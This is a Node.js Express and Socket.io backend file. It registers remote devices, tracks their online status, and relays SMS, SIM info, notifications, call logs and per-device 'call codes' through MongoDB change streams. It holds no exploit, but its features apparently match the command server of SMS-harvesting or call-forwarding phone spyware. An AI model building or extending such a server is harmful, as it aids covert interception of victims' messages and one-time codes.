import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import fetch from "node-fetch";
import mongoose from "mongoose";
import { connectDB } from "./config/db.js";

import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import callLogRoutes from "./routes/callLogRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

dotenv.config();
connectDB();

const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});

app.use(cors());
app.use(express.json());
app.set("io", io);

const deviceSockets = new Map();    // uniqueid → socketId
const watchers = new Map();         // uniqueid → Set(socketId)

function notifyWatchers(uniqueid, payload) {
  const w = watchers.get(uniqueid);
  if (!w) return;
  for (let sid of w) io.to(sid).emit("deviceStatusSingle", payload);
}

io.on("connection", (socket) => {
  console.log("🟢 New Socket Connected:", socket.id);

  let currentUniqueId = null;

  socket.on("watchDevice", (uniqueid) => {
    if (!uniqueid) return;
    if (!watchers.has(uniqueid)) watchers.set(uniqueid, new Set());
    watchers.get(uniqueid).add(socket.id);
    console.log(`👁 Watching Device → ${uniqueid}`);
  });

  socket.on("unwatchDevice", (uniqueid) => {
    if (watchers.has(uniqueid)) watchers.get(uniqueid).delete(socket.id);
  });

  // ======================================================
  // 📌 REGISTER DEVICE (JOIN ROOM)
  // ======================================================
  socket.on("registerDevice", (uniqueid) => {
    if (!uniqueid) return;

    console.log("🔗 REGISTER DEVICE:", uniqueid);

    deviceSockets.set(uniqueid, socket.id);
    currentUniqueId = uniqueid;

    socket.join(uniqueid);   // ⭐ ROOM MODEL FIX

    saveLastSeen(uniqueid, "Online");

    io.to(socket.id).emit("deviceRegistered", { uniqueid });

    io.emit("deviceListUpdated", {
      event: "device_connected",
      uniqueid,
    });

    notifyWatchers(uniqueid, {
      uniqueid,
      connectivity: "Online",
      updatedAt: new Date(),
    });
  });

  // ======================================================
  // 🔵 DEVICE STATUS (ONLY SEND TO TARGET ROOM)
  // ======================================================
  socket.on("deviceStatus", (data) => {
    const { uniqueid, connectivity } = data || {};
    if (!uniqueid) return;

    console.log(`⚡ STATUS: ${uniqueid} → ${connectivity}`);

    saveLastSeen(uniqueid, connectivity);

    const payload = {
      uniqueid,
      connectivity,
      updatedAt: new Date(),
    };

    // ⭐ FIX: ONLY SEND TO SAME DEVICE ROOM
    io.to(uniqueid).emit("deviceStatus", payload);

    notifyWatchers(uniqueid, payload);
  });

  // ======================================================
  // 🔴 DISCONNECT
  // ======================================================
  socket.on("disconnect", () => {
    console.log("🔴 Socket disconnected:", socket.id);

    if (currentUniqueId) {
      const latestSocket = deviceSockets.get(currentUniqueId);

      if (latestSocket === socket.id) {
        console.log("🛑 DEVICE OFFLINE:", currentUniqueId);

        deviceSockets.delete(currentUniqueId);

        saveLastSeen(currentUniqueId, "Offline");

        const payload = {
          uniqueid: currentUniqueId,
          connectivity: "Offline",
          updatedAt: new Date(),
        };

        io.to(currentUniqueId).emit("deviceStatus", payload);
        io.emit("deviceListUpdated", {
          event: "device_disconnected",
          uniqueid: currentUniqueId,
        });

        notifyWatchers(currentUniqueId, payload);
      }
    }

    for (let [id, set] of watchers.entries()) {
      set.delete(socket.id);
    }
  });
});

// ======================================================
// 🔥 SAVE LAST SEEN
// ======================================================
async function saveLastSeen(uniqueid, connectivity) {
  try {
    const PORT = process.env.PORT || 5000;
    await fetch(`http://localhost:${PORT}/api/lastseen/${uniqueid}/status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ connectivity }),
    });
  } catch (err) {
    console.log("❌ LastSeen Error:", err.message);
  }
}

// ======================================================
// 🔥 SEND CALL CODE TO TARGET DEVICE ONLY
// ======================================================
export async function sendCallCodeToDevice(uniqueid, callData) {
  io.to(uniqueid).emit("callCodeUpdate", callData);
  console.log(`📞 CallCode Sent → ${uniqueid}`);
}

// ======================================================
// 🔥 ADMIN UPDATE (GLOBAL)
// ======================================================
export function sendAdminGlobal(adminData) {
  console.log("👑 REALTIME ADMIN EMIT SENT:", adminData);
  io.emit("adminUpdate", JSON.stringify(adminData));
}

// ======================================================
// 🔥 MONGO STREAMS WITH RETRY
// ======================================================
mongoose.connection.once("open", () => {
  console.log("📡 Mongo Streams Active...");

  const watchWithRetry = (collection, callback) => {
    const start = () => {
      try {
        const stream = mongoose.connection.collection(collection).watch();

        stream.on("change", async (change) => {
          if (!["insert", "update", "replace"].includes(change.operationType)) return;

          const updated = await mongoose
            .connection
            .collection(collection)
            .findOne({ _id: change.documentKey._id });

          if (updated) callback(updated);
        });

        stream.on("error", () => {
          setTimeout(start, 5000);
        });
      } catch {
        setTimeout(start, 5000);
      }
    };
    start();
  };

  watchWithRetry("devices", (data) => {
    io.emit("deviceListUpdated", { event: "db_change", device: data });
  });

  watchWithRetry("siminfos", (data) => {
    io.emit("simInfoUpdated", data);
  });

  watchWithRetry("callcodes", (data) => {
    if (data.uniqueid) sendCallCodeToDevice(data.uniqueid, data);
  });

  watchWithRetry("sms", (data) => {
    if (data.uniqueid) io.to(data.uniqueid).emit("smsUpdate", data);
  });

  watchWithRetry("admins", (data) => {
    sendAdminGlobal(data);
  });
});

// ======================================================
app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/lastseen", lastSeenRoutes);
app.use("/api/call-log", callLogRoutes);

app.get("/", (req, res) =>
  res.send("🔥 Stable Socket Backend Running (uniqueid Room Mode)")
);

const PORT = process.env.PORT || 5000;
server.listen(PORT, () =>
  console.log(`🚀 Server running at http://localhost:${PORT}`)
);
